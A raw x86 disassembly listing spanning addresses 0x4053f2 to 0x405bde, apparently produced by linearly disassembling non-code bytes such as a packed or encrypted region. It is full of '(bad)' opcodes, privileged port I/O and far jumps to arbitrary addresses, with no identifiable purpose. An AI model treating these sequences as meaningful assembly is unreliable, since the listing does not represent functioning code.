  4053f2:	add    DWORD PTR [edx-0x1c5412fc],esi
  4053f8:	cmp    DWORD PTR [ecx],ebx
  4053fa:	outs   dx,DWORD PTR ds:[esi]
  4053fb:	scas   al,BYTE PTR es:[edi]
  4053fc:	jbe    0x4053db
  4053fe:	mov    ch,ch
  405400:	gs aaa 
  405402:	mov    dl,0x56
  405404:	mov    al,0x20
  405406:	out    0xba,eax
  405408:	mov    WORD PTR [eax-0x3e],es
  40540b:	lods   al,BYTE PTR ds:[esi]
  40540c:	xor    DWORD PTR [eax],esi
  40540e:	loopne 0x4053f8
  405410:	mov    BYTE PTR [esi-0x5c],ah
  405413:	jecxz  0x405485
  405415:	clc    
  405416:	mov    ebp,0x92af8fd5
  40541b:	je     0x405400
  40541d:	push   ss
  40541e:	push   eax
  40541f:	ins    DWORD PTR es:[edi],dx
  405420:	imul   esp,DWORD PTR [edi-0x76],0x608fbf44
  405427:	cwde   
  405428:	sbb    cl,BYTE PTR [ebx-0x22]
  40542b:	cmp    eax,0x7be86afb
  405430:	inc    ecx
  405431:	call   0x5a7aeb12
  405436:	loopne 0x40542f
  405438:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405439:	jg     0x405489
  40543b:	mov    ch,0x8d
  40543d:	mov    ecx,0xb0ae07b9
  405442:	(bad)  
  405443:	mov    es,WORD PTR [eax]
  405445:	xchg   DWORD PTR [ebx+0x1dcd6f74],edi
  40544b:	mov    eax,0xbbdd7aa2
  405450:	dec    ebp
  405451:	ret    
  405452:	mov    al,0x6b
  405454:	int3   
  405455:	add    bh,al
  405457:	js     0x4054b0
  405459:	jecxz  0x4054cc
  40545b:	jae    0x405441
  40545d:	or     dh,ah
  40545f:	jmp    0x4053f5
  405461:	adc    edx,ebx
  405463:	es jp  0x405457
  405466:	(bad)  
  405467:	(bad)  
  405468:	xor    edi,DWORD PTR [ebp-0x10f62559]
  40546e:	adc    ebp,edi
  405470:	sbb    eax,DWORD PTR [ecx-0xbf34a32]
  405476:	xor    al,0x14
  405478:	mov    dh,0xef
  40547a:	cmc    
  40547b:	lods   al,BYTE PTR es:[esi]
  40547d:	das    
  40547e:	in     al,0x7b
  405480:	out    dx,al
  405481:	jg     0x40549b
  405483:	xchg   BYTE PTR [esi+0x29],bh
  405486:	call   0x52a6b560
  40548b:	push   esi
  40548c:	push   eax
  40548d:	xor    cl,0x3e
  405490:	inc    edi
  405491:	test   eax,0xcb6eb432
  405496:	sub    ah,cl
  405498:	test   al,0x58
  40549a:	pop    ds
  40549b:	ficom  WORD PTR [edi-0x4c]
  40549e:	or     BYTE PTR [ecx],dh
  4054a0:	fwait
  4054a1:	jo     0x405517
  4054a3:	test   BYTE PTR [eax+0x4e],0xd9
  4054a7:	test   bh,al
  4054a9:	aam    0xe3
  4054ab:	les    eax,FWORD PTR [edx]
  4054ad:	out    0xf9,eax
  4054af:	mov    ebx,0x7a45ce56
  4054b4:	inc    ebp
  4054b5:	inc    edi
  4054b6:	xlat   BYTE PTR ds:[ebx]
  4054b7:	push   esp
  4054b8:	in     al,0xa5
  4054ba:	jbe    0x40546b
  4054bc:	jle    0x4054a3
  4054be:	adc    al,dh
  4054c0:	call   0xd5826c9c
  4054c5:	mov    eax,0x2c4d6d37
  4054ca:	or     DWORD PTR [esi+0x260eac84],esi
  4054d0:	arpl   cx,ax
  4054d2:	push   esp
  4054d3:	mov    DWORD PTR [ecx],edx
  4054d5:	shr    ah,0xf8
  4054d8:	std    
  4054d9:	call   0x467c:0xd34c48a0
  4054e0:	xchg   edx,eax
  4054e1:	in     al,dx
  4054e2:	push   edi
  4054e3:	stos   BYTE PTR es:[edi],al
  4054e4:	arpl   WORD PTR [edx],di
  4054e6:	mov    esi,0x3cee2d2d
  4054eb:	xor    edi,esi
  4054ed:	xor    ebx,ebx
  4054ef:	lea    edi,[eax]
  4054f1:	sub    DWORD PTR [ebp+0x19302d4b],eax
  4054f7:	pusha  
  4054f8:	jp     0x4054ad
  4054fa:	adc    eax,0xd7f61791
  4054ff:	iret   
  405500:	lahf   
  405501:	dec    esp
  405502:	push   edx
  405503:	loop   0x405576
  405505:	push   cs
  405506:	add    ah,ah
  405508:	cmp    DWORD PTR [esi+edx*4-0x3815394e],esi
  40550f:	push   ds
  405510:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405511:	popa   
  405512:	mov    edx,0xfdb48f19
  405517:	pop    esp
  405518:	fdiv   QWORD PTR [ebx-0x3447563]
  40551e:	push   es
  40551f:	cmc    
  405520:	mov    cs,WORD PTR ds:0xf09a6715
  405526:	popa   
  405527:	push   esp
  405528:	push   ds
  405529:	sub    eax,0x39c028d0
  40552e:	add    BYTE PTR [edi-0x9],0x9b
  405532:	cmp    eax,0xf4eca729
  405537:	push   ss
  405538:	test   DWORD PTR [edi],ebx
  40553a:	mov    ah,BYTE PTR [ebp+edx*1-0x7147e3df]
  405541:	and    ebp,DWORD PTR fs:[edx+0x4bc4e5f1]
  405548:	fldenv [esi]
  40554a:	sub    edi,ebp
  40554c:	lods   eax,DWORD PTR ds:[esi]
  40554d:	and    edi,0x73
  405550:	xchg   edi,eax
  405551:	and    ah,BYTE PTR [eax+0x128dc53d]
  405557:	aad    0x3
  405559:	sbb    DWORD PTR [edx],0x52
  40555c:	ja     0x4054fe
  40555e:	and    eax,0x6024712c
  405563:	pop    ebx
  405564:	dec    esp
  405565:	xor    bl,al
  405567:	clc    
  405568:	or     DWORD PTR [ecx-0x28],edi
  40556b:	mov    esp,0xf25501a2
  405570:	cld    
  405571:	mov    ds:0x3a3f9853,al
  405576:	int    0xd9
  405578:	daa    
  405579:	jl     0x40553b
  40557b:	mov    eax,0x7e2f8e4e
  405580:	lds    esi,FWORD PTR [eax]
  405582:	push   ecx
  405583:	mov    ah,0xd0
  405585:	sub    DWORD PTR [ebp-0x3a],edx
  405588:	out    0x98,eax
  40558a:	(bad)  
  40558c:	ret    0xc8a1
  40558f:	imul   ebx,eax,0x2c
  405592:	out    dx,eax
  405593:	sar    BYTE PTR [ecx+0x20febfd4],0x54
  40559a:	lahf   
  40559b:	fild   DWORD PTR [ebx-0x11]
  40559e:	sahf   
  40559f:	xlat   BYTE PTR ds:[ebx]
  4055a0:	xor    DWORD PTR [eax],ebx
  4055a2:	pop    ebp
  4055a3:	cs inc edx
  4055a5:	jo     0x4055ad
  4055a7:	test   ah,cl
  4055a9:	popa   
  4055aa:	addr16 mov ds:0x229c,eax
  4055ae:	test   eax,0xe52b34c5
  4055b3:	add    eax,0x1d126d2a
  4055b8:	in     eax,dx
  4055b9:	aam    0x45
  4055bb:	mov    esp,0xe56690f
  4055c0:	es je  0x405617
  4055c3:	push   ebx
  4055c4:	sar    BYTE PTR [ebx-0x46],1
  4055c7:	outs   dx,DWORD PTR ds:[esi]
  4055c8:	ss and eax,0x730f85e2
  4055ce:	mov    al,0x71
  4055d0:	or     al,0x2
  4055d2:	mov    eax,ds:0x14abdc5f
  4055d7:	or     BYTE PTR [edi+0x4afc369a],dl
  4055dd:	or     DWORD PTR [ebp-0x14],ebp
  4055e0:	xchg   ecx,eax
  4055e1:	repz aam 0x2c
  4055e4:	pusha  
  4055e5:	cmp    al,0x5a
  4055e7:	add    al,0xca
  4055e9:	xlat   BYTE PTR ds:[ebx]
  4055ea:	push   eax
  4055eb:	inc    edi
  4055ec:	sub    eax,edx
  4055ee:	jno    0x405656
  4055f0:	jmp    0x90056bf3
  4055f5:	inc    ecx
  4055f6:	and    BYTE PTR [esi-0x75],bl
  4055f9:	pop    ecx
  4055fa:	imul   ebx,DWORD PTR [eax+0x1],0x4475054a
  405601:	push   es
  405602:	mov    dl,0xf3
  405604:	pop    edi
  405605:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405606:	jmp    FWORD PTR es:[ecx+0x5dbfc940]
  40560d:	and    al,0x53
  40560f:	repnz fwait
  405611:	sub    BYTE PTR [ebx+0x3e],dl
  405614:	mov    ds:0x65b2e1fe,eax
  405619:	aam    0xaf
  40561b:	fistp  QWORD PTR [eax]
  40561d:	inc    eax
  40561f:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  405621:	pop    eax
  405622:	test   ebp,ebx
  405624:	sub    bl,0x6c
  405627:	sbb    dl,dh
  405629:	jo     0x40564b
  40562b:	(bad)  
  40562c:	mov    dh,0x19
  40562e:	mov    eax,ds:0xcacda524
  405633:	add    al,0x9d
  405635:	cmc    
  405636:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405637:	sub    BYTE PTR [edx],ah
  405639:	in     eax,0x41
  40563b:	popf   
  40563c:	sbb    DWORD PTR [ecx-0x160d5b06],0xffffffcd
  405643:	cwde   
  405644:	pop    edi
  405645:	sub    BYTE PTR [edx],0x5d
  405648:	ficom  DWORD PTR [eax-0x274315df]
  40564e:	lds    ebp,FWORD PTR [ecx]
  405650:	jno    0x405632
  405652:	xchg   ecx,eax
  405653:	mov    eax,ds:0x368dd173
  405658:	fnstcw WORD PTR [edi]
  40565a:	ins    BYTE PTR es:[edi],dx
  40565b:	mov    edi,0xa04f63e7
  405660:	fild   QWORD PTR [ecx+0x0]
  405663:	add    BYTE PTR [ebp-0x2d],cl
  405666:	add    eax,0xa25be45f
  40566b:	fwait
  40566c:	xor    bh,BYTE PTR [edx+0x31aa9d3f]
  405672:	into   
  405673:	repz jae 0x405659
  405676:	inc    esp
  405677:	inc    ebx
  405678:	xor    BYTE PTR [eax],bh
  40567a:	sbb    al,0x9b
  40567c:	fimul  WORD PTR [edi-0x191f2e7f]
  405682:	push   ebp
  405683:	adc    BYTE PTR [eax-0x244d8a44],dl
  405689:	outs   dx,BYTE PTR ds:[esi]
  40568a:	cmp    ah,ah
  40568c:	jg     0x405625
  40568e:	ds jmp 0xa38c:0x79a57145
  405696:	inc    BYTE PTR [edi+0x6b39bfbf]
  40569c:	dec    eax
  40569d:	inc    ecx
  40569e:	xor    ebx,DWORD PTR [esi-0x46]
  4056a1:	mov    ecx,0x804d43f4
  4056a6:	or     esp,DWORD PTR [ecx]
  4056a8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4056a9:	out    0x6e,al
  4056ab:	loop   0x405690
  4056ad:	clc    
  4056ae:	sub    BYTE PTR [eax],dh
  4056b0:	cld    
  4056b1:	out    dx,al
  4056b2:	dec    edx
  4056b3:	pop    edx
  4056b4:	sub    al,0x6c
  4056b6:	adc    ebx,edi
  4056b8:	add    esp,DWORD PTR [esi-0x1]
  4056bb:	and    edi,eax
  4056bd:	in     al,dx
  4056be:	xor    eax,0xcafd6d9d
  4056c3:	sbb    eax,0xea4ff9cc
  4056c8:	jmp    0x4056c0
  4056ca:	iret   
  4056cb:	pop    esi
  4056cc:	js     0x40571a
  4056ce:	retf   0x394f
  4056d1:	sbb    al,0x75
  4056d3:	outs   dx,DWORD PTR ds:[esi]
  4056d4:	(bad)  
  4056d5:	cs jecxz 0x40571a
  4056d8:	push   ds
  4056d9:	adc    edi,DWORD PTR [ecx+edx*1-0x5e]
  4056dd:	imul   esp,DWORD PTR [ebp+edx*1+0x52f05de7],0x29
  4056e5:	push   ss
  4056e6:	(bad)  
  4056e8:	lea    ebx,[ebp+0x66d47a6c]
  4056ee:	ret    0x4dc0
  4056f1:	jne    0x405761
  4056f3:	pop    esp
  4056f4:	or     BYTE PTR [edi-0x57],bh
  4056f7:	jp     0x405762
  4056f9:	cli    
  4056fa:	mov    dl,0xa1
  4056fc:	sti    
  4056fd:	ja     0x40568c
  4056ff:	or     DWORD PTR [eax-0x1b],esp
  405702:	test   al,0x8e
  405704:	jae    0x40576a
  405706:	sbb    BYTE PTR [ecx-0x65330a8b],cl
  40570c:	and    BYTE PTR [eax+ebx*8],ah
  40570f:	js     0x405727
  405711:	bound  eax,QWORD PTR [esi-0x42]
  405714:	inc    ebp
  405715:	pop    ss
  405716:	sti    
  405717:	xor    ecx,edi
  405719:	ret    0xe015
  40571c:	push   0x2e
  40571e:	outs   dx,DWORD PTR ds:[esi]
  40571f:	jb     0x405777
  405721:	(bad)  [esi+0x5ad1592c]
  405727:	xor    al,0x95
  405729:	or     al,0xc
  40572b:	into   
  40572c:	jnp    0x40573d
  40572e:	and    al,0xc9
  405730:	fdivr  QWORD PTR [eax+eiz*8]
  405733:	sbb    ecx,0xc45cc34e
  405739:	jne    0x405759
  40573b:	(bad)  
  40573c:	in     al,dx
  40573d:	sub    al,BYTE PTR [edx]
  40573f:	jecxz  0x405733
  405741:	repnz push eax
  405743:	mov    eax,0xe9ddd52b
  405748:	xchg   BYTE PTR [edx],dh
  40574a:	pop    edx
  40574b:	adc    al,0xd4
  40574d:	and    eax,0xfebc55ad
  405752:	jle    0x4057a9
  405754:	mov    edx,ecx
  405756:	call   0x77bde6d0
  40575b:	pop    esi
  40575c:	or     al,0x40
  40575e:	leave  
  40575f:	iret   
  405760:	mov    bl,0xc6
  405762:	cmp    ecx,esi
  405764:	pushf  
  405765:	mov    eax,ds:0x64c4bdfd
  40576a:	xor    al,0xc6
  40576c:	mov    ebp,0x8e6a2126
  405771:	lods   al,BYTE PTR ds:[esi]
  405772:	push   ebx
  405773:	push   edi
  405774:	mov    ebp,0xbeaee2e5
  405779:	adc    eax,0xc367ed2e
  40577e:	pop    esi
  40577f:	jno    0x4057ee
  405781:	jecxz  0x40573c
  405783:	js     0x40578c
  405785:	adc    esp,edx
  405787:	pushf  
  405788:	arpl   WORD PTR [ecx],bx
  40578a:	std    
  40578b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40578c:	rol    bh,cl
  40578e:	mov    al,ds:0xe20d4be3
  405793:	and    DWORD PTR [edx],esi
  405795:	mov    esi,0xccb5cb2e
  40579a:	stos   DWORD PTR es:[edi],eax
  40579b:	clc    
  40579c:	push   edi
  40579d:	fist   DWORD PTR [edi]
  40579f:	rcl    BYTE PTR [edi],0x69
  4057a2:	jmp    0x8e0a:0xab454293
  4057a9:	pop    esp
  4057aa:	retf   
  4057ab:	fidiv  DWORD PTR [esi+0x65]
  4057ae:	sub    BYTE PTR [esp+esi*1-0x25b19144],0x1f
  4057b6:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4057b8:	inc    edi
  4057b9:	imul   ebx,DWORD PTR fs:[ebp+0x6e5e46da],0xfad82659
  4057c4:	push   esi
  4057c5:	mov    ebx,0x9871aaef
  4057ca:	push   ebx
  4057cb:	mov    ds:0x92381d8d,eax
  4057d0:	outs   dx,DWORD PTR ds:[esi]
  4057d1:	out    dx,eax
  4057d2:	mov    gs,WORD PTR [esi+edx*8]
  4057d5:	repz popf 
  4057d7:	xchg   ebx,eax
  4057d8:	mov    edi,0x3763d9da
  4057dd:	(bad)  
  4057df:	sti    
  4057e0:	bound  ebp,QWORD PTR [edx+0x63]
  4057e3:	popf   
  4057e4:	push   ds
  4057e5:	pop    ecx
  4057e6:	ret    0xdfd3
  4057e9:	pop    es
  4057ea:	test   edx,ebp
  4057ec:	jmp    0x1ad03541
  4057f1:	loop   0x4057d8
  4057f3:	xor    eax,0x94452701
  4057f8:	retf   0x1341
  4057fb:	cld    
  4057fc:	dec    eax
  4057fd:	jo     0x405816
  4057ff:	stc    
  405800:	cmp    eax,0x7622072
  405805:	lods   al,BYTE PTR ds:[esi]
  405806:	test   ebp,0x6c1afab8
  40580c:	int3   
  40580d:	xor    al,0x5e
  40580f:	dec    esi
  405810:	dec    edi
  405811:	cmp    eax,0xe32d6320
  405816:	push   ebp
  405817:	das    
  405818:	cmp    BYTE PTR [edx-0x73],al
  40581b:	mov    cl,0x35
  40581d:	sub    BYTE PTR [ecx+0x109c2e34],0xec
  405824:	popa   
  405825:	xor    BYTE PTR [edi],cl
  405827:	fadd   QWORD PTR [eax+0x28]
  40582a:	adc    al,0x4a
  40582c:	cmp    ch,BYTE PTR [esi+edi*8]
  40582f:	cmp    esp,DWORD PTR [ecx]
  405831:	fdiv   QWORD PTR [esi]
  405833:	mov    edi,0xb1d2123a
  405838:	scas   eax,DWORD PTR es:[edi]
  405839:	pop    es
  40583a:	into   
  40583b:	cmp    al,0xf7
  40583d:	(bad)  
  40583e:	retfw  0x4124
  405842:	jge    0x40584a
  405844:	stc    
  405845:	push   ds
  405846:	or     bh,BYTE PTR [edx+edi*4+0x56]
  40584a:	dec    ebx
  40584b:	in     eax,0xbe
  40584d:	jp     0x405811
  40584f:	cmc    
  405850:	add    BYTE PTR [edx],cl
  405852:	mov    cl,0xa4
  405854:	push   eax
  405855:	pusha  
  405856:	mov    eax,ds:0x6a0b7c28
  40585b:	fs lahf 
  40585d:	add    BYTE PTR [eax+0x6f],dh
  405860:	stc    
  405861:	into   
  405862:	(bad)  
  405863:	fnstsw WORD PTR [esi-0x1]
  405866:	push   esi
  405867:	pop    edx
  405868:	and    ecx,DWORD PTR [edx-0x760e0053]
  40586e:	cmc    
  40586f:	mov    eax,ds:0x53332df6
  405874:	fisub  DWORD PTR [esi-0x8]
  405877:	adc    eax,0xf93e1f57
  40587c:	pop    ecx
  40587d:	push   ss
  40587e:	mov    WORD PTR [eax],ds
  405880:	sti    
  405881:	pusha  
  405882:	mov    al,0x59
  405884:	pop    edi
  405885:	pop    ds
  405886:	or     al,0x23
  405888:	dec    ebp
  405889:	mov    ebx,0x919ec0
  40588e:	mov    edi,0x6f5ab9f0
  405893:	mov    WORD PTR [esi],gs
  405895:	add    ah,cl
  405897:	xor    eax,esp
  405899:	and    eax,0x7fae5f45
  40589e:	mov    BYTE PTR [edx-0x2e7acac2],ah
  4058a4:	mov    ah,0x97
  4058a6:	sbb    eax,0x754367b9
  4058ab:	mov    al,ds:0x482d6da3
  4058b0:	jp     0x4058cb
  4058b2:	jns    0x405836
  4058b4:	and    al,0x85
  4058b6:	adc    al,0xbc
  4058b8:	xchg   ebp,eax
  4058b9:	ret    0x2c2a
  4058bc:	ss es enter 0xcfbb,0x1f
  4058c2:	adc    BYTE PTR [eax],dh
  4058c4:	repz pop eax
  4058c6:	clc    
  4058c7:	loopne 0x4058b8
  4058c9:	jno    0x4058cd
  4058cb:	sub    cl,BYTE PTR [esi+0x5207df35]
  4058d1:	cmp    eax,0x4c53add
  4058d6:	loop   0x40585c
  4058d8:	rcl    eax,1
  4058da:	add    dl,cl
  4058dc:	or     DWORD PTR [ebx],esi
  4058de:	add    eax,0xc8964214
  4058e3:	out    dx,eax
  4058e4:	arpl   WORD PTR [edx+0x1cc22d81],si
  4058ea:	push   0x64
  4058ec:	mov    ecx,0xbfd1cb85
  4058f1:	in     ax,dx
  4058f3:	mov    DWORD PTR [esi+esi*1+0x1dd0a98a],edi
  4058fa:	lea    ebx,[edx]
  4058fc:	push   edx
  4058fd:	pop    ss
  4058fe:	ins    DWORD PTR es:[edi],dx
  4058ff:	cmp    al,0xb2
  405901:	dec    ebx
  405902:	test   al,0x98
  405904:	sbb    cl,BYTE PTR [ecx+0x65]
  405907:	mov    cl,0x65
  405909:	xor    al,BYTE PTR [edx-0x24]
  40590c:	adc    dh,BYTE PTR [esi-0x45c59d8e]
  405912:	add    DWORD PTR [edx-0x69],edx
  405915:	(bad)  
  405916:	jecxz  0x405980
  405918:	jbe    0x40592c
  40591a:	mov    ah,0xd
  40591c:	mov    dh,0xa2
  40591e:	add    BYTE PTR [ebx],bh
  405920:	mov    al,0x36
  405922:	test   esi,ebp
  405924:	stos   BYTE PTR es:[edi],al
  405925:	add    DWORD PTR [ebx+0x45caf094],ebp
  40592b:	nop
  40592c:	nop
  40592d:	fld    TBYTE PTR ds:0x494c8021
  405933:	adc    BYTE PTR [esi+0x2b],cl
  405936:	inc    eax
  405937:	jnp    0x40595d
  405939:	and    eax,0x88339e30
  40593e:	fs daa 
  405940:	call   0xa31a:0xf4828de3
  405947:	mov    ch,0x2a
  405949:	nop
  40594a:	test   eax,0xa8144e8
  40594f:	aaa    
  405950:	call   0xcb8980ab
  405955:	pop    edx
  405956:	jne    0x4059c2
  405958:	aad    0xf2
  40595a:	jle    0x40592f
  40595c:	add    al,0x88
  40595e:	repnz add ch,dl
  405961:	pop    ds
  405962:	xchg   edx,eax
  405963:	dec    esi
  405964:	or     cl,ah
  405966:	or     ecx,ebp
  405968:	push   es
  405969:	mov    bh,0xc3
  40596b:	add    BYTE PTR [edi-0x85c54e8],dh
  405971:	sub    eax,0x9ffde442
  405976:	mov    eax,ds:0x39bbeef
  40597b:	les    eax,FWORD PTR [edx]
  40597d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40597e:	icebp  
  40597f:	nop
  405980:	cmp    BYTE PTR [edi],0x8d
  405983:	stos   BYTE PTR es:[edi],al
  405984:	xchg   BYTE PTR [ebx-0xa468026],ah
  40598a:	pop    es
  40598b:	push   ebp
  40598c:	neg    BYTE PTR [esi]
  40598e:	fucomp st(2)
  405990:	shl    DWORD PTR [edi+ecx*8],cl
  405993:	adc    ebp,DWORD PTR [ecx-0x53e04117]
  405999:	loope  0x405976
  40599b:	lods   al,BYTE PTR ds:[esi]
  40599c:	cwde   
  40599d:	sbb    esi,ebx
  40599f:	rcl    BYTE PTR [edi-0x72],cl
  4059a2:	jae    0x40593b
  4059a4:	dec    ebx
  4059a5:	jne    0x405a00
  4059a7:	push   ebp
  4059a8:	int3   
  4059a9:	push   esp
  4059aa:	pop    edi
  4059ab:	mov    edi,0x91abe257
  4059b0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4059b1:	ja     0x405974
  4059b3:	imul   esi,DWORD PTR [edx+0x43cc8b7c],0xa
  4059ba:	(bad)  
  4059bb:	(bad)  
  4059bd:	retf   0xb45d
  4059c0:	daa    
  4059c1:	sub    DWORD PTR [esp+edx*2-0x54d00934],esp
  4059c8:	addr16 cwde 
  4059ca:	push   ebp
  4059cb:	jmp    0xfdfb:0xc252449a
  4059d2:	pop    edi
  4059d3:	lock cs fwait
  4059d6:	inc    ebp
  4059d7:	sbb    ecx,eax
  4059d9:	jbe    0x4059cd
  4059db:	mov    WORD PTR [edi-0x1d797742],ss
  4059e1:	ret    
  4059e2:	push   eax
  4059e3:	sub    DWORD PTR [ecx],edi
  4059e5:	sar    dh,cl
  4059e7:	jns    0x4059ca
  4059e9:	jbe    0x4059a9
  4059eb:	dec    ecx
  4059ec:	push   edi
  4059ed:	xchg   BYTE PTR [ecx+eiz*4],al
  4059f0:	lea    ebx,[esi+ebx*1+0xa]
  4059f4:	adc    DWORD PTR [edx],ecx
  4059f6:	mov    esi,gs
  4059f8:	xchg   dx,ax
  4059fa:	xor    al,bh
  4059fc:	xor    DWORD PTR [ebx+ecx*1],esi
  4059ff:	pusha  
  405a00:	mov    ah,0xe1
  405a02:	pop    ebx
  405a03:	stos   BYTE PTR es:[edi],al
  405a04:	(bad)  
  405a05:	pop    ebp
  405a06:	fisttp DWORD PTR [edx+0x9d02abf]
  405a0c:	xor    cl,dl
  405a0e:	fs int3 
  405a10:	aad    0xbe
  405a12:	push   eax
  405a13:	dec    edi
  405a14:	(bad)  
  405a16:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405a17:	(bad)  
  405a18:	sbb    ah,BYTE PTR [esi-0xccd9827]
  405a1e:	adc    esp,DWORD PTR [ebp+0x3e]
  405a21:	mov    ds:0x2fd24fbc,eax
  405a26:	adc    bh,al
  405a28:	or     eax,0x8f8c045c
  405a2d:	pop    ecx
  405a2e:	dec    ebx
  405a2f:	xlat   BYTE PTR ds:[ebx]
  405a30:	mov    al,ds:0xd112f42
  405a35:	sbb    eax,0xd8251fac
  405a3a:	mov    eax,cs
  405a3c:	cmp    al,0x23
  405a3e:	pop    ebx
  405a3f:	scas   al,BYTE PTR es:[edi]
  405a40:	test   eax,0x7423d34e
  405a45:	mov    edi,0x192127d0
  405a4a:	mov    ah,0xfb
  405a4c:	mov    DWORD PTR [ecx-0x2b],esp
  405a4f:	cmp    eax,0x60efcdb8
  405a54:	fldcw  WORD PTR [esi+0x1]
  405a57:	add    eax,0x8499514
  405a5d:	pop    ss
  405a5e:	popf   
  405a5f:	sbb    DWORD PTR [esi+0x4b],eax
  405a62:	out    0x64,eax
  405a64:	xchg   esp,eax
  405a65:	sti    
  405a66:	pusha  
  405a67:	mov    cl,BYTE PTR [edx-0x16b504f9]
  405a6d:	push   ebp
  405a6e:	mov    eax,ds:0x694431dc
  405a73:	mov    BYTE PTR [eax],cl
  405a75:	sub    BYTE PTR [esp+edi*8],ch
  405a78:	mov    ecx,0xd105058c
  405a7d:	jns    0x405aa0
  405a7f:	retf   0x215b
  405a82:	(bad)  
  405a83:	loope  0x405a78
  405a85:	mov    WORD PTR [edx],fs
  405a87:	push   eax
  405a88:	mov    ds:0x90099042,al
  405a8d:	sbb    bh,BYTE PTR [ebx]
  405a8f:	mov    esi,0xe81de754
  405a94:	ss ja  0x405a26
  405a97:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405a98:	std    
  405a99:	cmp    dh,BYTE PTR [ebp+0x12087a19]
  405a9f:	mov    al,ds:0x691282f7
  405aa4:	sbb    bh,dl
  405aa6:	adc    dh,al
  405aa8:	cwde   
  405aa9:	in     eax,0x59
  405aab:	jge    0x405a8d
  405aad:	add    dh,cl
  405aaf:	sub    DWORD PTR [edi+0x222786c8],esp
  405ab5:	sbb    edx,DWORD PTR [eax-0x31b43106]
  405abb:	jg     0x405a8e
  405abd:	xor    DWORD PTR [edi-0xd],0xffffffd4
  405ac1:	pop    ecx
  405ac2:	mov    esi,0xc1c05d52
  405ac7:	mov    ebx,0x223b2eaa
  405acc:	jl     0x405aca
  405ace:	nop
  405acf:	fdiv   st,st(2)
  405ad1:	js     0x405ae1
  405ad3:	jle    0x405abb
  405ad5:	ja     0x405a68
  405ad7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405ad8:	mov    WORD PTR [ebp+0x32],?
  405adb:	ret    0x253a
  405ade:	jecxz  0x405a7e
  405ae0:	jb     0x405ac2
  405ae2:	aam    0xd6
  405ae4:	dec    ebp
  405ae5:	xor    DWORD PTR [esi],0x77
  405ae8:	add    al,0x40
  405aea:	jp     0x405aa1
  405aec:	outs   dx,BYTE PTR ds:[esi]
  405aed:	cmp    BYTE PTR [eax+ebx*2+0x7c],dl
  405af1:	adc    BYTE PTR [edx],al
  405af3:	call   0xa56c:0xd4f94040
  405afa:	gs jb  0x405ae1
  405afd:	mov    edx,0x3dac0351
  405b02:	dec    ebx
  405b03:	lods   eax,DWORD PTR ds:[esi]
  405b04:	and    al,0x3
  405b06:	repnz retf 0xf64d
  405b0a:	(bad)  
  405b0b:	fimul  WORD PTR [ebp+0x3b]
  405b0e:	xchg   ebp,eax
  405b0f:	test   eax,0x8144bc63
  405b14:	cli    
  405b15:	pop    ds
  405b16:	and    al,0x7e
  405b18:	mov    esi,0x29bc70ec
  405b1d:	in     eax,0xc8
  405b1f:	mov    ds:0x94d53047,eax
  405b24:	aad    0xe8
  405b26:	jbe    0x405b8d
  405b28:	mov    dl,0x76
  405b2a:	inc    edx
  405b2b:	mov    esp,DWORD PTR [edi+edi*2+0x5cdda1c8]
  405b32:	lock mov al,0x7b
  405b35:	test   ebp,esp
  405b37:	ja     0x405ba2
  405b39:	rol    BYTE PTR [esi+eiz*8],cl
  405b3c:	sbb    esi,edx
  405b3e:	and    DWORD PTR [ebx],ecx
  405b40:	jns    0x405b08
  405b42:	popf   
  405b43:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405b44:	and    ebp,edx
  405b46:	pop    ss
  405b47:	push   ebx
  405b48:	pop    esp
  405b49:	push   esi
  405b4a:	hlt    
  405b4b:	pop    esi
  405b4c:	and    al,0x3f
  405b4e:	and    bl,ah
  405b50:	(bad)  
  405b52:	push   ecx
  405b53:	dec    ebp
  405b54:	daa    
  405b55:	and    cl,dl
  405b57:	xchg   esp,eax
  405b58:	fwait
  405b59:	lahf   
  405b5a:	and    eax,0xf2a2a6bd
  405b5f:	push   edi
  405b60:	scas   eax,DWORD PTR es:[edi]
  405b61:	push   DWORD PTR [edx-0x3]
  405b64:	and    al,BYTE PTR [edx-0x2cd4d390]
  405b6a:	push   ebp
  405b6b:	or     eax,0x8d493a0d
  405b70:	mov    ecx,0xf8a73465
  405b75:	jmp    0x6ec6da78
  405b7a:	ret    0x7257
  405b7d:	or     ah,cl
  405b7f:	cmp    al,0xe8
  405b81:	gs retf 
  405b83:	(bad)  
  405b84:	pusha  
  405b85:	call   0xdcd:0x3717d08c
  405b8c:	cmp    eax,0xc3d6c922
  405b91:	addr16 inc esi
  405b93:	rcl    bl,cl
  405b95:	sub    eax,ebx
  405b97:	pop    eax
  405b99:	enter  0xf13e,0xe7
  405b9d:	adc    BYTE PTR [edx-0x7364934e],bh
  405ba3:	gs mov al,0x31
  405ba6:	xchg   edi,eax
  405ba7:	cdq    
  405ba8:	xchg   esi,eax
  405ba9:	pop    esi
  405baa:	xor    BYTE PTR [eax+0x5cc32b6],0x79
  405bb1:	inc    esi
  405bb2:	mov    ah,0xa1
  405bb4:	pop    es
  405bb5:	mov    al,0xa2
  405bb7:	mov    ds:0xeca35b1e,al
  405bbc:	inc    edx
  405bbd:	mov    bh,0xf9
  405bbf:	cmp    DWORD PTR [ebx-0x5d6bd1be],ecx
  405bc5:	int    0xdb
  405bc7:	sbb    al,0x2b
  405bc9:	ins    DWORD PTR es:[edi],dx
  405bca:	pop    es
  405bcb:	stos   BYTE PTR es:[edi],al
  405bcc:	mov    al,0x3a
  405bce:	stos   BYTE PTR es:[edi],al
  405bcf:	lods   al,BYTE PTR ds:[esi]
  405bd0:	fist   DWORD PTR [edi+0x74]
  405bd3:	dec    eax
  405bd4:	leave  
  405bd5:	and    BYTE PTR [ecx*4+0x61a5420e],cl
  405bdc:	adc    al,0x84
  405bde:	inc    ebp
